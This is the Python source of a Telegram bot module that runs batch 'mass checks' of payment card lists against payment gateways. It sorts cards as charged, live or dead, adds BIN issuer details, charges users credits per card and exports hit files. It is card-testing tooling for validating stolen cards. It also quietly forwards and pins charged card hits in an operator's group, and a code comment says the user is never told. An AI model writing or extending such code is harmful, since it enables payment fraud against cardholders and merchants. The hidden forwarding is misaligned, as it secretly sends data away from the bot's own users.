import asyncio
import inspect
import logging
import time
import random
from datetime import datetime
from io import BytesIO
from html import escape as html_escape

import aiohttp
from aiogram import types, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest
from aiogram.filters.callback_data import CallbackData

from database import get_user_credits, update_credits, update_user_stats
from bin import get_bin_info
from mass_gates._tg_helpers import send_hit, edit_message_safe, safe_reply

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PREMIUM EMOJI IDs (same set as msh/mchk/mst mass gates)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CUSTOM_CHARGED_EMOJI_ID = "5359719332542718652"
CUSTOM_APPROVED_EMOJI_ID = "6044254523009012231"
CUSTOM_DECLINED_EMOJI_ID = "5893081007153746175"
EMOJI_GATEWAY = f'<tg-emoji emoji-id="5085022089103016925">⚡</tg-emoji>'
EMOJI_PRICE = f'<tg-emoji emoji-id="5424976816530014958">👛</tg-emoji>'
EMOJI_BRAND = f'<tg-emoji emoji-id="6136275172283391020">⭐</tg-emoji>'
EMOJI_CARD = f'<tg-emoji emoji-id="4956719506027185156">💎</tg-emoji>'
EMOJI_ISSUER = f'<tg-emoji emoji-id="6136246765369694911">🦇</tg-emoji>'
EMOJI_COUNTRY = f'<tg-emoji emoji-id="5463071033256848094">🔝</tg-emoji>'
EMOJI_RESPONSE = f'<tg-emoji emoji-id="6136275172283391020">⭐</tg-emoji>'
EMOJI_USER = f'<tg-emoji emoji-id="5359719332542718652">💎</tg-emoji>'
EMOJI_DEV = f'<tg-emoji emoji-id="6255712466118905093">⚡</tg-emoji>'

DEV_LINK = '<a href="https://t.me/Enchanted_linux_0x">Enchanted_linux_0x</a>'
HIT_LOG_GROUP_ID = -1004453592223

# Session registry: session_id -> session dict (for callback handlers)
BATCH_SESSIONS = {}

# Pending selection state (before the user taps ▶ Start)
BATCH_PENDING = {}


class BatchSelCallback(CallbackData, prefix="batchsel"):
    sel_id: str
    action: str   # "charged" | "approved" | "start"


def _selection_text(charged: bool, approved: bool, total: int) -> str:
    charged_s = "✅ 𝗢𝗡" if charged else "❌ 𝗢𝗙𝗙"
    approved_s = "✅ 𝗢𝗡" if approved else "❌ 𝗢𝗙𝗙"
    return (
        f"<b><tg-emoji emoji-id=\"5361734213370396027\">⚙️</tg-emoji> 𝐒𝐄𝐋𝐄𝐂𝐓𝐈𝐎𝐍</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ➠</b> <code>{total}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➠</b> <b>{charged_s}</b>\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➠</b> <b>{approved_s}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Tap the buttons to toggle what is sent to your DM, then press 𝐒𝐭𝐚𝐫𝐭.</i>"
    )


def _selection_keyboard(sel_id: str, charged: bool, approved: bool) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="𝐂𝐡𝐚𝐫𝐠𝐞𝐝",
                callback_data=BatchSelCallback(sel_id=sel_id, action="charged").pack(),
                style="success" if charged else "primary",
                icon_custom_emoji_id=CUSTOM_CHARGED_EMOJI_ID,
            ),
            InlineKeyboardButton(
                text="𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝",
                callback_data=BatchSelCallback(sel_id=sel_id, action="approved").pack(),
                style="success" if approved else "primary",
                icon_custom_emoji_id=CUSTOM_APPROVED_EMOJI_ID,
            ),
        ],
        [
            InlineKeyboardButton(
                text="𝐒𝐭𝐚𝐫𝐭",
                callback_data=BatchSelCallback(sel_id=sel_id, action="start").pack(),
                style="primary",
            ),
        ],
    ])


async def show_selection(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, extra_stats_fn=None, max_workers=30):
    """Show the charged/approved selection window before starting a batch check."""
    sel_id = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
    BATCH_PENDING[sel_id] = {
        "user_id": user_id,
        "cards": cards,
        "check_fn": check_fn,
        "gateway": gateway,
        "user_obj": user_obj,
        "prefix": prefix,
        "plan_name": plan_name,
        "charged": True,
        "approved": False,
        "extra_stats_fn": extra_stats_fn,
        "max_workers": max_workers,
    }
    msg = await safe_reply(message, 
        _selection_text(True, False, len(cards)),
        parse_mode="HTML",
        reply_markup=_selection_keyboard(sel_id, True, False),
    )
    if msg is None:
        logging.warning("[BATCH] selection window dropped (FloodWait)")
        BATCH_PENDING.pop(sel_id, None)
        return
    BATCH_PENDING[sel_id]["msg_id"] = msg.message_id
    BATCH_PENDING[sel_id]["chat_id"] = message.chat.id


async def handle_selection_callback(callback: types.CallbackQuery, callback_data: BatchSelCallback):
    sel_id = callback_data.sel_id
    action = callback_data.action
    pending = BATCH_PENDING.get(sel_id)
    if not pending:
        await callback.answer("⚠️ Selection expired — run the command again.", show_alert=True)
        return
    if callback.from_user.id != pending.get("user_id"):
        await callback.answer("❌ No permission", show_alert=True)
        return
    if action == "charged":
        pending["charged"] = not pending["charged"]
    elif action == "approved":
        pending["approved"] = not pending["approved"]
    elif action == "start":
        if BATCH_PENDING.pop(sel_id, None) is None:
            await callback.answer("Already starting...")
            return
        charged = pending.get("charged", True)
        approved = pending.get("approved", False)
        try:
            await callback.message.edit_text("🚀 Starting mass check...", parse_mode="HTML")
        except Exception:
            pass
        await callback.answer("🚀 Starting...")
        asyncio.create_task(run_batch_check(
            callback.message, pending["cards"], pending["check_fn"], pending["gateway"],
            pending["user_id"], pending["user_obj"], pending["prefix"], pending["plan_name"],
            send_charged=charged, send_approved=approved,
            extra_stats_fn=pending.get("extra_stats_fn"),
            max_workers=pending.get("max_workers", 30),
        ))
        return
    charged = pending.get("charged", True)
    approved = pending.get("approved", False)
    try:
        await callback.message.edit_text(
            _selection_text(charged, approved, len(pending.get("cards", []))),
            parse_mode="HTML",
            reply_markup=_selection_keyboard(sel_id, charged, approved),
        )
    except Exception as e:
        logging.error(f"[BATCH] selection edit error: {e}")
    await callback.answer("✅ Updated")

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]


async def get_anime_gif():
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=3) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"


def classify_status(status):
    u = str(status).upper()
    if u == "CHARGED":
        return "charged"
    if u in ("3DS", "3D", "3D_SECURE"):
        return "three_d"
    if u in ("APPROVED", "LIVE"):
        return "approved"
    if u == "DECLINED":
        return "declined"
    return "errors"


def build_user_link(user_obj):
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


async def _deduct_one(user_id):
    def _f():
        bal = get_user_credits(user_id)
        update_credits(user_id, max(0, bal - 1))
    await asyncio.to_thread(_f)


PROGRESS_EMOJI_ID = "5258419835922030550"
PROGRESS_BAR_WIDTH = 10


def progress_bar(checked, total):
    if not total:
        return "░" * PROGRESS_BAR_WIDTH, "0.0%"
    ratio = min(max(checked / total, 0.0), 1.0)
    filled = int(ratio * PROGRESS_BAR_WIDTH)
    bar = "█" * filled + "░" * (PROGRESS_BAR_WIDTH - filled)
    return bar, f"{ratio * 100:.1f}%"


def build_progress_text(session_id, gate_display, checked, total, charged, approved, declined, three_d, errors, elapsed_str, workers=0, extra_lines=None, last_entry=""):
    """Unified mass-check progress layout — identical across all mass gates (matches /msh)."""
    bar, percent = progress_bar(checked, total)
    extra = ""
    if extra_lines:
        extra = "\n".join(extra_lines) + "\n"
    return (
        f"<a href='https://t.me/Enchanted_linux_0x'>✧</a> <b>𝐒𝐭𝐚𝐭𝐮𝐬   ➠</b>   <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...</b> <tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>\n"
        f"<a href='https://t.me/Enchanted_linux_0x'>✧</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ➠</b> <code>{session_id}</code>\n"
        f"<a href='https://t.me/Enchanted_linux_0x'>✧</a> <b>𝐓𝐨𝐭𝐚𝐥 ➠</b> <code>「 {checked}/{total} 」</code>\n"
        f"      <tg-emoji emoji-id=\"{PROGRESS_EMOJI_ID}\">⏳</tg-emoji> <b>𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 ➠</b> <code>{bar}</code> <b>{percent}</b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➠</b> <b>{charged} </b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➠</b> <b>{approved} </b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji> <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➠</b> <b>{declined} </b>\n"
        f"      <tg-emoji emoji-id=\"5258419835922030550\">🔐</tg-emoji> <b>𝟑𝐃 ➠</b> <b>{three_d} </b>\n"
        f"<a href='https://t.me/Enchanted_linux_0x'>π</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠</b> {gate_display}\n"
        f"      <tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>𝐄𝐫𝐫𝐨𝐫 ➠</b> <b>{errors} </b>\n"
        f"      <tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> <b>𝐖𝐨𝐫𝐤𝐞𝐫𝐬 ➠</b> <b>{workers}</b>\n"
        f"      <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji> <b>𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➠</b> <b>{elapsed_str}</b>\n"
        f"{extra}"
        f"{last_entry}"
        f"<b><tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji> 𝐃𝐞𝐯 ➠</b> {DEV_LINK}"
    )


def get_result_buttons(prefix, session_id, session, is_running=True):
    buttons = [
        [
            InlineKeyboardButton(
                text=f"AᴘᴘƦᴏᴠᴇᴅ ({session['approved']})",
                callback_data=f"{prefix}_res_{session_id}_live",
                style="success",
                icon_custom_emoji_id=CUSTOM_APPROVED_EMOJI_ID,
            ),
            InlineKeyboardButton(
                text=f"Dᴇᴄʟɪͷᴇᴅ ({session['declined']})",
                callback_data=f"{prefix}_res_{session_id}_dead",
                style="danger",
                icon_custom_emoji_id=CUSTOM_DECLINED_EMOJI_ID,
            ),
        ],
        [
            InlineKeyboardButton(
                text=f"CʜᴀƦɢᴇᴅ ({session['charged']})",
                callback_data=f"{prefix}_res_{session_id}_charged",
                style="primary",
                icon_custom_emoji_id=CUSTOM_CHARGED_EMOJI_ID,
            ),
            InlineKeyboardButton(
                text=f"Tᴏᴛᴀʟ ({session['checked']})",
                callback_data=f"{prefix}_res_{session_id}_all",
                style="primary",
            ),
        ],
    ]
    if is_running:
        buttons.append([
            InlineKeyboardButton(
                text="Sᴛᴏᴘ sᴇsSɪᴏɴ",
                callback_data=f"{prefix}_stop_{session_id}",
                style="danger",
            )
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def generate_result_file_content(session, result_type):
    if result_type == "charged":
        cards = session.get("charged_cards", [])
        label = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    elif result_type == "live":
        cards = session.get("approved_cards", [])
        label = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
    elif result_type == "dead":
        cards = session.get("declined_cards", [])
        label = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    else:
        cards = (
            session.get("charged_cards", []) +
            session.get("approved_cards", []) +
            session.get("three_d_cards", []) +
            session.get("declined_cards", []) +
            session.get("error_cards", [])
        )
        label = "𝐀𝐥𝐥"

    lines = []
    lines.append("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    lines.append("┃         𝑪𝑯𝑶𝑹 𝑷𝑨𝑳𝑻𝑨𝑵          ┃")
    lines.append("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    lines.append("")
    lines.append(f"𝐑𝐞𝐬𝐮𝐥𝐭 𝐓𝐲𝐩𝐞 ➠ {label}")
    lines.append(f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ➠ {len(cards)}")
    lines.append(f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ {session.get('gateway', '')}")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")

    if not cards:
        lines.append("⚠️ No cards found for this category")
    else:
        for cd in cards:
            cc = cd.get("card", "N/A")
            response = cd.get("response", "N/A")
            brand = cd.get("brand", "N/A")
            bank = cd.get("bank", "N/A")
            country = cd.get("country", "N/A")
            status = cd.get("status", "N/A")
            amount = cd.get("amount_inr", "N/A")

            lines.append(f"𝐒𝐭𝐚𝐭𝐮𝐬 ➠ {status}")
            lines.append(f"𝐂𝐚𝐫𝐝 ➠ {cc}")
            lines.append(f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ {session.get('gateway', '')}")
            lines.append(f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ {response}")
            real_resp = cd.get("real_response", "")
            if real_resp:
                lines.append(f"𝐑𝐞𝐚𝐥 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ {real_resp}")
            lines.append(f"𝐀𝐦𝐨𝐮𝐧𝐭 ➠ ₹{amount}")
            lines.append(f"𝐁𝐫𝐚𝐧𝐝 ➠ {brand}")
            lines.append(f"𝐈𝐬𝐬𝐮𝐞𝐫 ➠ {bank}")
            lines.append(f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ {country}")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            lines.append("")

    content = "\n".join(lines)
    buf = BytesIO(content.encode("utf-8"))
    buf.seek(0)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"CHORPALTAN_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
    return buf, filename, len(cards)


# prefix -> group chat id that silently receives charged/approved hits (pinned there)
GATE_GROUP_LOG = {}


async def send_gif_result(bot, user_obj, card, response, brand, bin_data, gateway, status_label, plan_name, group_log_id=None, to_user=True):
    bin_scheme = html_escape(str(bin_data.get("scheme", brand or "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_name} {country_flag}" if country_flag else country_name
    safe_response = html_escape(str(response))
    user_link = build_user_link(user_obj)
    user_display = f"{user_link} <b>[{html_escape(str(plan_name))}]</b>"
    gif_url = await get_anime_gif()

    header = f"<blockquote>✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji></blockquote>"
    if status_label == "CHARGED":
        header = f"<blockquote>💎 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐇𝐈𝐓 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji></blockquote>"

    caption = (
        f"{header}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI_CARD} 𝐂𝐚𝐫𝐝 ➠ <tg-spoiler><code>{html_escape(card)}</code></tg-spoiler>\n"
        f"{EMOJI_GATEWAY} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ <b>{html_escape(gateway)}</b>\n"
        f"{EMOJI_BRAND} 𝐁𝐫𝐚𝐧𝐝 ➠ <b>{bin_scheme}</b>\n"
        f"{EMOJI_ISSUER} 𝐈𝐬𝐬𝐮𝐞𝐫 ➠ <b>{bin_bank}</b>\n"
        f"{EMOJI_COUNTRY} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ <b>{bin_country}</b>\n"
        f"{EMOJI_RESPONSE} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ <b>{safe_response}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI_USER} 𝐔𝐬𝐞𝐫 ➠ {user_display}\n"
        f"{EMOJI_DEV} 𝐃𝐞𝐯 ➠ {DEV_LINK}"
    )

    if to_user and user_obj is not None:
        await send_hit(bot, user_obj.id, caption, gif_url)
    if group_log_id:
        sent = await send_hit(bot, group_log_id, caption, gif_url)
        if sent is not None:
            try:
                await bot.pin_chat_message(chat_id=group_log_id, message_id=sent.message_id)
            except Exception as e:
                logging.warning(f"[BATCH] pin to group failed: {e}")


async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, send_charged=True, send_approved=False, extra_stats_fn=None, max_workers=30):
    """
    Full mass checker matching the shopify (msh) mass-gate result flow:
    - semaphore(30) concurrency (never checks all cards at once)
    - GIF result DM per approved/charged card
    - progress message with result buttons + stop button
    - result .txt files on button click
    """
    total = len(cards)
    session_id = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
    bot = message.bot

    session = {
        "session_id": session_id,
        "prefix": prefix,
        "gateway": gateway,
        "chat_id": message.chat.id,
        "user_id": user_id,
        "user_obj": user_obj,
        "msg_id": None,
        "total": total,
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "three_d": 0,
        "errors": 0,
        "status": "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...",
        "start_time": time.time(),
        "last_text": "",
        "last_update_time": 0,
        "charged_cards": [],
        "approved_cards": [],
        "declined_cards": [],
        "three_d_cards": [],
        "error_cards": [],
        "tasks": [],
        "send_charged": send_charged,
        "send_approved": send_approved,
        "active_workers": 0,
        "extra_stats_fn": extra_stats_fn,
        "last_entry": "",
    }

    # Send the initial progress message (with result + stop buttons)
    initial_text = build_progress_text(session_id, gateway, 0, total, 0, 0, 0, 0, 0, "0s")
    initial_buttons = get_result_buttons(prefix, session_id, session, is_running=True)
    proc_msg = await safe_reply(message, initial_text, parse_mode="HTML", reply_markup=initial_buttons)
    if proc_msg is None:
        logging.warning(f"[BATCH] progress message dropped (FloodWait) for session {session_id}")
        return
    session["msg_id"] = proc_msg.message_id
    session["chat_id"] = message.chat.id

    BATCH_SESSIONS[session_id] = session

    sem = asyncio.Semaphore(max_workers)
    lock = asyncio.Lock()

    async def update_progress():
        elapsed = int(time.time() - session["start_time"])
        minutes, seconds = elapsed // 60, elapsed % 60
        elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
        extra_lines = None
        if session.get("extra_stats_fn"):
            try:
                r = session["extra_stats_fn"]()
                if inspect.isawaitable(r):
                    extra_lines = await r
                else:
                    extra_lines = r
            except Exception:
                extra_lines = None
        text = build_progress_text(
            session_id, gateway,
            session["checked"], total,
            session["charged"], session["approved"], session["declined"], session.get("three_d", 0), session["errors"],
            elapsed_str, workers=session.get("active_workers", 0), extra_lines=extra_lines,
            last_entry=session.get("last_entry", ""),
        )
        if session.get("last_text") == text:
            return
        is_running = session["status"] == "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."
        reply_markup = get_result_buttons(prefix, session_id, session, is_running=is_running)
        await edit_message_safe(bot, session["chat_id"], session["msg_id"], text,
                                parse_mode="HTML", reply_markup=reply_markup)
        session["last_text"] = text
        session["last_update_time"] = time.time()

    async def worker(card):
        async with sem:
            if session["status"] == "𝗦𝘁𝗼𝗽𝗽𝗲𝗱":
                return
            session["active_workers"] = session.get("active_workers", 0) + 1
            try:
                res = await asyncio.to_thread(check_fn, card)
            except Exception as e:
                res = ("ERROR", str(e)[:80], "UNKNOWN")
            finally:
                session["active_workers"] = max(0, session.get("active_workers", 0) - 1)
            real_response = None
            if isinstance(res, (tuple, list)) and len(res) >= 5:
                status, msg, brand, amount, real_response = res[0], res[1], res[2], res[3], res[4]
            elif isinstance(res, (tuple, list)) and len(res) >= 4:
                status, msg, brand, amount = res[0], res[1], res[2], res[3]
            elif isinstance(res, (tuple, list)) and len(res) >= 3:
                status, msg, brand = res[0], res[1], res[2]
                amount = None
            else:
                status, msg, brand, amount = "ERROR", str(res), "UNKNOWN", None

        kind = classify_status(status)

        await asyncio.to_thread(update_user_stats, user_id, kind == "approved")

        # bin info for approved/charged result captions
        bin_data = {}
        cc_num = card.split("|")[0] if "|" in card else card[:6]
        if kind in ("approved", "charged"):
            try:
                bin_data = await get_bin_info(cc_num[:6])
            except Exception:
                bin_data = {}

        entry = {
            "card": card,
            "response": str(msg),
            "brand": str(brand),
            "bank": bin_data.get("bank", "N/A"),
            "country": (f"{bin_data.get('country', 'N/A')} {bin_data.get('country_emoji', '')}").strip(),
            "status": kind.upper() if kind != "errors" else "ERROR",
            "amount_inr": amount if amount is not None else "N/A",
            "real_response": real_response,
        }

        async with lock:
            session[kind] = session.get(kind, 0) + 1
            session["checked"] += 1
            session["last_entry"] = (
                f"📋 <b>𝐋𝐚𝐬𝐭 ➠</b> <code>{card}</code>\n"
                f"      <b>➠</b> <code>{str(msg)[:70]}</code> · ₹{amount if amount is not None else 'N/A'}"
            )
            if kind == "charged":
                session["charged_cards"].append(entry)
            elif kind == "approved":
                session["approved_cards"].append(entry)
            elif kind == "three_d":
                session["three_d_cards"].append(entry)
            elif kind == "declined":
                session["declined_cards"].append(entry)
            else:
                session["error_cards"].append(entry)

            should_update = (time.time() - session.get("last_update_time", 0)) >= 2.0 or session["checked"] == total

        # silent group log (charged/approved always forwarded + pinned, user never told)
        gid = GATE_GROUP_LOG.get(session.get("prefix", ""))
        if gid and kind == "charged":
            await send_gif_result(bot, user_obj, card, msg, brand, bin_data, gateway, "CHARGED", plan_name, group_log_id=gid, to_user=False)

        # send result for approved/charged hits (respect the DM toggles)
        if kind == "charged" and session.get("send_charged", True):
            await send_gif_result(bot, user_obj, card, msg, brand, bin_data, gateway, "CHARGED", plan_name)
        elif kind == "approved" and session.get("send_approved", False):
            await send_gif_result(bot, user_obj, card, msg, brand, bin_data, gateway, "APPROVED", plan_name)

        if should_update:
            await update_progress()

    tasks = [asyncio.create_task(worker(c)) for c in cards]
    session["tasks"] = tasks

    await asyncio.gather(*tasks, return_exceptions=True)

    if session["status"] != "𝗦𝘁𝗼𝗽𝗽𝗲𝗱":
        session["status"] = "𝗦𝘂𝗺𝗺𝗮𝗿𝘆"
    await update_progress()




async def handle_result_callback(callback: types.CallbackQuery):
    """Send the result .txt file for a category. callback.data = <prefix>_res_<sid>_<type>."""
    try:
        parts = callback.data.split("_")
        # e.g. ["mauth", "res", "ABC123XY", "live"] or ["mstripe", "res", "ABC123XY", "all"]
        session_id = parts[2]
        result_type = parts[3]
    except Exception:
        await callback.answer("⚠️ Invalid callback", show_alert=True)
        return

    session = BATCH_SESSIONS.get(session_id)
    if not session:
        try:
            await callback.answer("⚠️ Session expired", show_alert=True)
        except Exception:
            pass
        return

    if callback.from_user.id != session.get("user_id"):
        try:
            await callback.answer("❌ No permission", show_alert=True)
        except Exception:
            pass
        return

    buf, filename, count = generate_result_file_content(session, result_type)
    if count == 0:
        type_names = {"charged": "Charged", "live": "Approved", "dead": "Declined", "all": ""}
        try:
            await callback.answer(f"❌ No {type_names.get(result_type, '')} cards found", show_alert=True)
        except Exception:
            pass
        return

    try:
        await callback.answer("📦 Generating report...", show_alert=False)
    except Exception:
        pass

    file_content = buf.read()
    buf.seek(0)
    labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱", "dead": "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱", "all": "𝗔𝗹𝗹"}
    caption = (
        f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➠ {labels.get(result_type, '𝗔𝗹𝗹')}\n"
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➠ <b>{count}</b>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➠ {session.get('gateway', '')}"
    )
    document = types.BufferedInputFile(file=file_content, filename=filename)
    try:
        await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
    except Exception as e:
        logging.error(f"[BATCH] result file send error: {e}")


async def handle_stop_callback(callback: types.CallbackQuery):
    """Stop a running session. callback.data = <prefix>_stop_<sid>."""
    try:
        parts = callback.data.split("_")
        session_id = parts[2]
    except Exception:
        try:
            await callback.answer("⚠️ Invalid callback", show_alert=True)
        except Exception:
            pass
        return

    session = BATCH_SESSIONS.get(session_id)
    if not session:
        try:
            await callback.answer("⚠️ Session expired", show_alert=True)
        except Exception:
            pass
        return

    if callback.from_user.id != session.get("user_id"):
        try:
            await callback.answer("❌ No permission", show_alert=True)
        except Exception:
            pass
        return

    if session["status"] != "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...":
        try:
            await callback.answer("ℹ️ Not running", show_alert=True)
        except Exception:
            pass
        return

    session["status"] = "𝗦𝘁𝗼𝗽𝗽𝗲𝗱"
    # interrupt the rz gate's sync workers (they sleep in threads on cooldown)
    if session.get("prefix") == "mrz":
        try:
            import mass_gates.mrz as _mrz
            _mrz.stop_all()
        except Exception:
            pass
    if session.get("prefix") == "mpu":
        try:
            import mass_gates.mpu as _mpu
            _mpu.stop_all()
        except Exception:
            pass
    cancelled = 0
    for t in session.get("tasks", []):
        if not t.done():
            t.cancel()
            cancelled += 1
    try:
        await callback.answer(f"🛑 Stopping... ({cancelled} tasks)", show_alert=False)
    except Exception:
        pass

    session["last_text"] = ""
    # rebuild progress text with stopped status
    elapsed = int(time.time() - session["start_time"])
    minutes, seconds = elapsed // 60, elapsed % 60
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
    text = build_progress_text(
        session_id, session["gateway"],
        session["checked"], session["total"],
        session["charged"], session["approved"], session["declined"], session.get("three_d", 0), session["errors"],
        elapsed_str,
    )
    try:
        await callback.message.edit_text(text=text, parse_mode="HTML", reply_markup=get_result_buttons(session["prefix"], session_id, session, is_running=False))
    except Exception as e:
        logging.error(f"[BATCH] stop edit error: {e}")




# ── Shared selection router (registered once in main.py) ──
sel_router = Router()


@sel_router.callback_query(BatchSelCallback.filter())
async def _selection_cb(callback: types.CallbackQuery, callback_data: BatchSelCallback):
    await handle_selection_callback(callback, callback_data)
